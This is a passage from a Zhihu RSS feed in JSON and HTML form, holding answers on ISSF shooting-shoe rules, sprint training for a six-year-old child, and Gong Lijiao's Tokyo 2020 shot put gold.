data-watermark=\"watermark\" data-original-src=\"v2-8f2115d5f6c2b5aaaa7635cc12dda9bd\" data-watermark-src=\"v2-6208fe7e4ff1cf415820fd14efae0c60\" data-private-watermark-src=\"v2-7c64117af74e7817d86c51592dec1192\"></p>\n<p><br></p>\n<p>但本质上，射击又会避免装备带来的稳定性额外加成，所以对装备依然有条条框框的检测标准。</p>\n<p>比如射击鞋。</p>\n<p>在站姿射击中，站立的稳定性、鞋底的防滑性无疑是很重要的。<b>假设选手穿着完全无法曲折、也毫无缓震性的中底，显然稳定性就能达到最大——issf就杜绝了这种情况。</b></p>\n<p>它要求射击鞋“必须是可弯曲的”。专门有个测试射击鞋的器械，要求<b>15牛顿米的力施加到中底时，鞋底必须达到至少22.5°的弯曲。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ef6a31cde5087face3793b46a4baba79_720w.jpg?rss\" data-rawwidth=\"2072\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"专业射击用鞋在中底厚度、鞋帮高度等都有严格要求，因为都可能会增加射击时的额外稳定性\" data-watermark=\"watermark\" data-original-src=\"v2-ef6a31cde5087face3793b46a4baba79\" data-watermark-src=\"v2-9915911ea4f747e5296fcd7ca077cc55\" data-private-watermark-src=\"v2-7db8aeafbba433d1c8909a44c8ec50ec\"></p>\n<p><br></p>\n<p>因而，射击服、射击鞋等一方面为了这项运动的单个选手量身定制，尽可能满足稳定性的需要，一方面又不能成为提升精准度、左右成绩的额外加成。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">为什么田径室外百米记录要比室内百米记录快？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">122 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/30252383?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">近视眼对玩射击或者射箭运动的障碍大吗？</a><br><a href=\"http://www.zhihu.com/question/345087864?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高中女生左眼近视625右眼近视675能否参加运动会100米短跑？</a><br>\n","link":"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"6 岁的孩子说想学跑步，成为像苏炳添那样的运动员，作为家长该如何培养？","date":"2021-08-02 03:45:08","description":"\n<p>田径出身的一名大学田径队教练来谈一谈我的看法，希望有所借鉴。</p>\n<p>我先从专业的角度，来给一些解答。</p>\n<h2>7-14岁是孩子速度发展的一个窗口期</h2>\n<p>人的身体素质，包括速度、力量、耐力、灵敏、平衡等，在不同的年龄段，都会有发展比较迅速或缓慢的时候，当然儿童处在成长期，身体各指标都会快速增长，但总有增长尤为突出的某项指标，我们把这段快速增长的一段时期，称为快速发展的“窗口期”。</p>\n<p>为什么小学会把快速跑当成一个衡量身体素质的重要指标呢？就是因此此年龄段，正好处在孩子速度快速发展的阶段，在这个阶段有意识地培养孩子的速度，提升孩子的爆发力，就会事半功倍。</p>\n<p>作为一名田径运动员、教练，苏炳添能够以打破亚洲纪录记录的成绩闯进奥运会男子100米决赛，成为第一个站在飞人赛道的黄种人，我由衷感到自豪！这个时候，如果孩子热爱体育，有这样的信念支撑他，有这么一个强有力的偶像光环作为他的榜样，作为父母，我给的建议是：</p>\n<p><b>支持他，从心理和实际行动上，给他鼓励和帮助！</b></p>\n<p><b>因为我深知，扎根一个梦想的种子，对于一个满怀激情的孩子来说，是无比重要！而此时父母给予的帮助对孩子来说，定会弥足珍贵！</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-96c0e546fd86fab8e1ef5412b8270e58_720w.jpg?rss\" data-rawwidth=\"2428\" data-rawheight=\"1358\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-96c0e546fd86fab8e1ef5412b8270e58\" data-watermark-src=\"v2-0c8f2561dccc838fad0ffff2f2d7ff93\" data-private-watermark-src=\"v2-1f6e03bacaa0a6f6ef6a5961346576d0\"></p>\n<p>作为父母，孩子的监护人，看着子女健康成长，衣食无忧，建功立业，结婚生子，是我们所愿所想。但培养他们良好的行为习惯，磨炼他们坚强的意志品质，遵守社会公德和法律，是父母的职责所在，此外，我们还希望在顺境中为其欢欣鼓舞，逆境中支持鼓励，给他们心中埋下一粒种子，为他们的梦想保驾护航。</p>\n<p>那么6岁的孩子究竟是否合适？在这些练习过程中又要注意什么呢？父母又要做什么呢？不要着急，请听我一一解答。</p>\n<h2>田径是一切运动的基础</h2>\n<p>请允许我\"王婆卖瓜\"一番，田径是运动之母，我们自打出生起，就跟田径运动分不开。走、跑、跳、投等，融入到我们的生活方方面面。<b>6岁的孩子即将进入发展速度的窗口期，因此在此时学习跑步，是一项非常明智的选择，对于提升孩子的整体素质，大有裨益。</b>不论是否今后从事体育项目，都会让孩子收益。当然如果今后发现天赋异禀，转成其他专业，相信田径带来的益处，绝对会让孩子受益匪浅。</p>\n<p><br></p>\n<p>俗话说的好，“兴趣是最好的老师”。孩子有了明确的偶像，有了学的兴趣，可谓有了“人和”。此时又是孩子练习短跑提升速度的窗口期，正所谓拥有了“天时”，那么这个“地利”，究竟如何获得呢？也就是我下面要讲的练什么，以及怎么练，以及练习过程中的注意事项。</p>\n<h2>身体锻炼一定要符合孩子身心发展</h2>\n<p>练什么怎么练，主要依据还是儿童在此时期的生理特点及心理特点来决定。孩子在6岁时，活泼爱动是天性，喜欢追赶打闹。你会发现带娃出去玩的时候，他们喜欢跑跑就停下，没休息多久马上就到处跑的情况反复发生。到底是为什么呢？简单来讲，<b>小朋友就好比一个封不上口的气球</b>，气打多了就会爆掉，因此能量存储有限。释放能量时，因为封不上口，“呼”的一下就全放走了，所以他们就容易累。气没了，再打气，不一会儿，他们又活力满满了。</p>\n<p>基于儿童身心发展特点，在给小朋友安排短跑练习时，有几个原则。</p>\n<blockquote>\n<b>第一，少量多次。</b><br><b>第二，循序渐进。</b><br><b>第三，娱乐性强。</b><br><b>第四，目标明确。</b>\n</blockquote>\n<h3><b>Rule NO.1 少量多次</b></h3>\n<p>小朋友耐力差，因此单次跑步的练习，距离一定不要长，控制好运动量。在每个单元的训练，合理规划好热身、练习时间、休息时间、放松，并且在休息时要注意补水和补充能量。多次，是因为儿童恢复能力好，可以在短暂休息后，再继续进行下一次练习。</p>\n<p>比如，我们在一堂40分钟的训练课中，可以给儿童安排10分钟的热身，热身时可进行慢跑或者做一些跟跑动有关的游戏，带着小朋友活动头、肩、髋、膝、踝各个关节，拉伸手臂和腿部肌肉，达到热身目的。25分钟的正课时间里，安排3组20米跑，组间休息1-2分钟，3组50米跑，组间休息2-3分钟。20米完成后，可增加休息时间，再进行50米练习。最后5分钟用来整理和放松，重点进行大、小腿的拉伸和背部的伸展放松。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8912ea1c3cc3782205098ceeff5ed43f_720w.jpg?rss\" data-rawwidth=\"1026\" data-rawheight=\"548\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8912ea1c3cc3782205098ceeff5ed43f\" data-watermark-src=\"v2-15b887ec5b1ae845b7a789035753b55f\" data-private-watermark-src=\"v2-50024f195a572935e12d543711ea183a\"></p>\n<h3>Rule NO.2 循序渐进</h3>\n<p>即使有了偶像，自己有浓厚的兴趣，也要注意循序渐进。苏炳添将近32岁，历时3届奥运之旅才终于冲进决赛，我们也不可能一天两天，一年两年，就能有质的飞跃。<b>尤其是在成绩大幅增长的时候，更应该注意保护，不能猛进。</b>我当年跳高受伤，就是因为在3个月从1.70米长了20厘米，身体其他方面素质没有跟上，太过激进，才会受伤影响了后续成绩增长的。因此，循序渐进，在孩子已经适应了前一单元的量和强度后，才可以再增加。</p>\n<p>例如，在前一次安排的主要内容里，小朋友在3组20米，3组50米已经可以完成后，在递进的练习中，可以通过增加量或者增加强度，以及同时增加量和强度的形式进行变换组合。</p>\n<p>PlanA 建议在保证运动强度不变的前提下，先提高运动量。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2e96f88f39e8d11bd9c4cd81320a4dec_720w.jpg?rss\" data-rawwidth=\"1012\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2e96f88f39e8d11bd9c4cd81320a4dec\" data-watermark-src=\"v2-9a55b9b4834a383a6e86c1b909786f66\" data-private-watermark-src=\"v2-ae0c4494d14d53027caccc624df1b19e\"></p>\n<p>PlanB 完成A方案后，再在运动量不变的情况下，提高运动强度。因为小朋友没有经过系统训练，很难体会速度感，不了解90%的速度跑和100%全力冲刺的区别，因此我们可以通过缩短间歇时间来提高运动强度。但要注意20米和50米之间的间歇要保障，进行休息和补水。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ca3b8640965669f06b2c28993544ef21_720w.jpg?rss\" data-rawwidth=\"1010\" data-rawheight=\"572\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca3b8640965669f06b2c28993544ef21\" data-watermark-src=\"v2-91de07b77e77fdde00f2ab18a37733fa\" data-private-watermark-src=\"v2-1cda9f216ad02f5c1855b7c9f1a1bb70\"></p>\n<p>PlanC 运动量和强度分别提升且适应后，再同时提高。这一单元的训练，对成绩的提升尤为重要，同样需要注意在20米结束后，保证充足的休息时间。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7ad885ef5346ea4e8e1e4543bcde23ac_720w.jpg?rss\" data-rawwidth=\"1028\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7ad885ef5346ea4e8e1e4543bcde23ac\" data-watermark-src=\"v2-9974145b54fd4a9aa7401b2024c33845\" data-private-watermark-src=\"v2-b75f1714d5343d75c1cdb736cb7c19d8\"></p>\n<p>根据儿童运动能力的提升和实际情况，组数、间歇时间，甚至是跑动距离都可以进行调整，这些计划和安排，都要因人而异，适时调整和改变。</p>\n<h3>Rule NO.3 娱乐性强</h3>\n<p>根据儿童心理发展特点，枯燥单一的练习，会让孩子失去兴趣。因此娱乐性就显得尤为重要。我们可以通过改变形式、方法，增加器材、设备等，提升孩子的兴趣，让看似枯燥的田径运动，也能发挥出它应有的魅力，让孩子在真正下定决心从事这项运动之前，仍然能够保有兴趣，让激情不被扼杀在摇篮里。<b>毕竟，真正的训练是非常苦的，每个奥运选手的成长之路，训练都是无比艰辛和刻苦，他们付出了常人无法想象的努力和心血。</b></p>\n<p>儿童在这个年龄，不仅仅是单一的直线跑。可以设定标志点，比如多种形式的折返跑、比如多人追逐跑（从前最常见的老鹰抓小鸡、撕名牌等）、配合道具的模仿救护员、消防员营救等多种形式，持球或其他物品的传递或亲子接力等，都可以融入进来，让孩子在提升速度练习的同时，觉得好玩并愿意坚持下去。</p>\n<p>去年冬天我带着小萌利用标志点进行了一些速度练习，可以跟各位分享几种方式方法。</p>\n<a href=\"https://www.zhihu.com/zvideo/1405368268631220224\">萌爸Kyle-标志点的速度练习</a><h3>Rule NO.4 目标明确</h3>\n<p>目标明确孩子执行力才更强。要有长期目标和短期目标。长期目标要有大的方向，尤其如果今后是奔着职业运动员发展的，要有一个大概的时间点，在此之前需要提升的专项素质和身体素质，都要达到要求才可以。短期目标要实际可操作付出努力后能达到，小到一次训练中孩子需要跑的距离，次数、时间等，都要有制定，这样孩子才会有动力，训练之后达成目标才会有成就感，也会激励他再接再厉继续前行。</p>\n<p>我们不能仅仅能看到的成绩的快慢。循序渐进，扎实走好每一步，有明确的目标，经过艰苦训练，才是苏炳添最终登上荣耀舞台的法宝。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-27c0964e1a9badd2229e15ee3a0e13f6_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"苏炳添的名字印刻在奥运会男子100米飞人大战的战场\" data-watermark=\"watermark\" data-original-src=\"v2-27c0964e1a9badd2229e15ee3a0e13f6\" data-watermark-src=\"v2-7910049c7652a94ec5b7cba374a8ed58\" data-private-watermark-src=\"v2-3cec0b19dc1f69b662064b823b73d546\"></p>\n<p>作为一名田径教练员，我也会根据不同项目，在不同时间，给队员安排具体的训练计划，让队员有目标，有侧重点，可操作，能执行。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3087386865d503c9f89cd2b85b6e039b_720w.jpg?rss\" data-rawwidth=\"970\" data-rawheight=\"1054\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3087386865d503c9f89cd2b85b6e039b\" data-watermark-src=\"v2-4083ba3c14aa26a1bb0ae887f21abffe\" data-private-watermark-src=\"v2-563ea294176285689e12f85c051dd35b\"></p>\n<h2>父母到底应该做什么？怎样支持孩子呢？</h2>\n<p>6岁的儿童还处在身体发展阶段，作为一名专业的田径教练员，<b>我强烈反对过早的竞技化</b>。因此，<b>不要把孩子送进体校，也不要过早确定短跑这个项目！</b></p>\n<p>如果家长有条件，可以先给孩子试着报一些体能培训班，当然有些培训机构以赚钱为目的，教练的能力参差不齐，有的会为了“效果”，过早的榨干孩子的潜能，而单一发展学生的某一身体素质。</p>\n<p>这时候，如果能送到有田径队的学校（大学、中学、小学皆可）里让孩子跟着活动，或送到更专业的地方就再好不过，<b>一定要跟教练说明来意，并表明观点：让孩子跟着玩，但不能像专业运动员一样练。</b>这么做的目的，一方面进行练习时会正规、系统；另一方面，可以让教练观察一下孩子在这方面是否有天赋。</p>\n<p>毕竟，竞技体育的选材都是非常严苛的。如果过早开发，可能会让孩子失去冲击更好成绩的机会；但如果孩子没有天赋，也好及时转型，避免时间、精力的浪费。但不论是否走专业路线，让孩子从事体育锻炼，适度练习对身体有很大好处，有益且有效。父母在孩子没有独立判断事情的能力之前，帮助孩子做最合理的决策，出谋划策，为他们的梦想护航，让他们向着正确的方向稳步前行。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/meng-ba-kyle?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">萌爸Kyle</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">128 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/35348789?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特是不是人类体育史上最伟大的运动员？</a><br><a href=\"http://www.zhihu.com/question/20350644?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特能否被称作迄今为止最伟大的田径运动员？</a><br>\n","link":"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运会女子铅球决赛巩立姣夺得中国奥运田赛第一金，如何评价她的表现？","date":"2021-08-01 06:30:09","description":"\n<p>奥运冠军，拿来吧你！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-19a919a693318c9d3a223cf738f64154_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1364\" data-watermark=\"original\" data-original-src=\"v2-19a919a693318c9d3a223cf738f64154\" data-watermark-src=\"v2-89ad0fcb085bf8f26d12806b9b944666\" data-private-watermark-src=\"v2-b855dae886ecfddae987202f3b8e4a7c\"></p>\n<p>在东京<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25A5%25A5%25E8%25BF%2590%25E4%25BC%259A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">奥运会</a>田径项目<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/7/3/75308d5b/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">田赛</a>女子<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/9/c/94c57403/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">铅球</a>决赛的比赛中，中国选手<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25B7%25A9%25E7%25AB%258B%25E5%25A7%25A3\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">巩立姣</a>以20.58米的成绩夺得了决赛第一名，刷新个人最佳成绩的同时也为<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E4%25B8%25AD%25E5%259B%25BD%25E4%25BB%25A3%25E8%25A1%25A8%25E5%259B%25A2\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中国代表团</a>拿下本届奥运会第22枚金牌，这也是中国田径队在东京奥运会上的首块金牌。</p>\n<p>回顾她本场比赛：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a28e7c0b5ce63028f177a8ff0924ddf2_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-a28e7c0b5ce63028f177a8ff0924ddf2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>出场，巩立姣发射爱心</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f540fbca74d4844d043cd6e9d1afeef5_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-f540fbca74d4844d043cd6e9d1afeef5\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第一投，19米95</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2c56d73d1cfa8fb839f74a9ecaaf6807_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-2c56d73d1cfa8fb839f74a9ecaaf6807\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第二投，主动犯规</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1dd4a645d000c2c4d25d87ec81f08fc1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-1dd4a645d000c2c4d25d87ec81f08fc1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第三投继续提升，投出19米98：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d56099cd9a9811f044364b03d5af4993_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-d56099cd9a9811f044364b03d5af4993\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第四投19米80状态回落</p>\n<p><img src=\"https://pic3.zhimg.com/v2-66a45c2c037c1e7b7fc2ea9192bb7c68_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-66a45c2c037c1e7b7fc2ea9192bb7c68\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第五投，一击致命！20米53直接打破个人最好成绩，提升了10厘米！几乎锁定金牌！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-34f8955289870802f7909c3e696d0f0a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-34f8955289870802f7909c3e696d0f0a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第六头继续提升！20米58！金牌，冠军！</p>\n<p>*******</p>\n<p>巩立姣曾说，每一届奥运会都像做梦一样，有的是美梦，有的是噩梦。而5年前的里约，无疑是后者。</p>\n<p>2016年5月，巩立姣投出20米43，刷新尘封七年之久的个人纪录，并创下当年的世界最好成绩。来到里约，她是女子铅球的头号夺金热门。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-334d3cb9e6b6eeb10688d5e36b1c86ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"379\" data-watermark=\"original\" data-original-src=\"v2-334d3cb9e6b6eeb10688d5e36b1c86ee\" data-watermark-src=\"v2-75d3360a37877f97fe58ae2027ae9f90\" data-private-watermark-src=\"v2-1689aff5c56355f232af07b6e7833caf\"></p>\n<p><br>决赛前夜，第三次参加奥运的巩立姣辗转反侧，脑子里不断浮现夺冠的场景，分不清是幻想还是梦境。然而第二天，迎接巩立姣的是残酷的现实，在奥运会的赛场上，她仿佛灵魂出窍。</p>\n<p>“投完第二投我就知道肯定没戏了。”巩立姣后来回忆，“第一次有这种感觉，我是人来疯，那场比赛想赶紧结束，每投一个球都是煎熬。”</p>\n<p>最后一投，巩立姣被匈牙利的马顿逆转，无缘领奖台。返回驻地的大巴上，巩立姣默默对自己说：“别做梦了，醒醒吧，都结束了，你是第四。”巩立姣把自己关在房间里，几天没吃东西，不愿意见人，离开奥运村时，她忍不住在众人面前嚎啕大哭。</p>\n<p>回国后，巩立姣始终不愿意面对冲金失利的现实，陷入抑郁的情绪中无法自拔，一度萌生退意。在德国外教克拉克的建议下，田径队为巩立姣请来了北京师范大学的心理老师，对她进行针对性心理辅导。</p>\n<p>人生中最难熬的时光，巩立姣还是挺了过来，引领她走出阴影的仍然是内心对冠军的渴望。当失意的2016年重新翻篇，巩立姣又一次上路，在三战钻石联赛中夺冠后，她发了一条朋友圈：“当你握紧双手，里面什么都没有；当你打开双手，世界就在你手中。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6c67a6ecb07006ca450107dbb2afef8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-6c67a6ecb07006ca450107dbb2afef8a\" data-watermark-src=\"v2-a4a9358616d9c56b9260975d593b4a41\" data-private-watermark-src=\"v2-887727d5e158eeb4901c5034a90fd563\"></p>\n<p>2017年8月，伦敦世锦赛，铅球决赛被安排在第六天。这是伦敦一周以来最冷的一天，秋风刺骨，大雨又为比赛设置了重重障碍。然而用巩立姣的话说，练到这个份上了，雨战又何妨？</p>\n<p>从第一投开始，巩立姣就确立了领先地位，除了里约奥运会冠军卡特在第三投超过19米之外，几乎没人能对巩立姣形成威胁。</p>\n<p>最终，巩立姣用19.94米的成绩杀死了最后的悬念。铅球刚一落地，巩立姣便兴奋地跳了起来，任由泪水和雨水在脸上流淌，对着转播镜头比出“六”的手势——这是她的第六次世锦赛——而观众席上的教练和队友早已把国旗挥舞了起来。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-99bcd9e813cf2cb3ef829b0f9cc8de0c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"296\" data-watermark=\"original\" data-original-src=\"v2-99bcd9e813cf2cb3ef829b0f9cc8de0c\" data-watermark-src=\"v2-b5be3ef93826fdb95bec5df019962512\" data-private-watermark-src=\"v2-f59cfd7b6d746471711a910c371e48e6\"></p>\n<p><br>对巩立姣来说，这个世界冠军拿得水到渠成，酣畅淋漓，也让中国女子铅球时隔24年再次站上世界之巅。“整个冬天都特别难过，还抑郁过一段时间。”巩立姣说，“其实从失败中走出来，回到正轨特别难，但自己还是挺了过来。因为我心里一直都有梦想，那就是站在世界最高领奖台上。我想，只要它还在，总有一天会实现的。”</p>\n<p>站上冠军领奖台，巩立姣哭着唱完国歌，过去十几年的训练画面像电影一样在脑海里过了一遍。‘没有什么比梦想更值得坚持’一直是她的座右铭，在国旗升起的那一刻，她对这句话的理解更深了，对她来说，跌倒后重新爬起来的过程和金牌同样重要。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-75291a00888d5c5166fe1ee0a6e7b3d1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"329\" data-watermark=\"original\" data-original-src=\"v2-75291a00888d5c5166fe1ee0a6e7b3d1\" data-watermark-src=\"v2-9c63db6af50ae1c89cb7430012dae42d\" data-private-watermark-src=\"v2-04d97448704f6c462edc73ddeec9c3f3\"></p>\n<p><br>2018年，从玉珍取代外教克拉克接管巩立姣，上任之后她给弟子布置了一个艰巨的任务——增重。“2015年我体重大约110公斤，当时教练觉得我脚下速度慢，想让我通过减重提爆发力。”巩立姣说，“不到一年我减了近15公斤，没想到减完之后，脚下的速度是上去了，手上的劲儿却没了。没办法，还得根据实际情况再增回来。一开始因为节食缩小的胃，为了增肥又得强行撑起来。那段时间害怕吃饭，每多吃一口都难受。”</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9c15be4113c2493bbff3c11d8b549f7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-9c15be4113c2493bbff3c11d8b549f7e\" data-watermark-src=\"v2-4fc5232190311c1be368189dcf356dad\" data-private-watermark-src=\"v2-8f64bf1abbe757217a818bbe10b2cb4f\"></p>\n<p>台上一分钟，台下十年功，粗略估计，巩立姣在训练中的投掷量达到几十万次。常年累月的高强度训练让巩立姣浑身是伤，每到阴雨天，右臂和左腿的关节就会隐隐作痛。为了减少伤病困扰，教练组借助更科学的手段，将巩立姣的训练精细化、数据化，重质量、轻数量，以前每天至少投200次，而现在一周也不过投200次。在投掷量减小的基础上，从玉珍把巩立姣的训练用球从6公斤改为8公斤。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ce4746599a6cf7a84f8379b1f4aa57ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"1332\" data-watermark=\"original\" data-original-src=\"v2-ce4746599a6cf7a84f8379b1f4aa57ad\" data-watermark-src=\"v2-98bcd10380b09497e1db3e3401253143\" data-private-watermark-src=\"v2-fddb18c70667a9d6295b68cc0e2ec6b5\"></p>\n<p>夺得伦敦世锦赛冠军后，巩立姣彻底打破了魔咒，进入一种独孤求败的状态，从2017年开始连续三年世界排名第一。2019年，巩立姣在参加的14项比赛中获得13枚金牌，其中包括在多哈世锦赛上完成卫冕，连续第三年赢下钻石联赛决赛。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-70b7f6dcfa6b38cb4e0bfcef93c8271a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-watermark=\"original\" 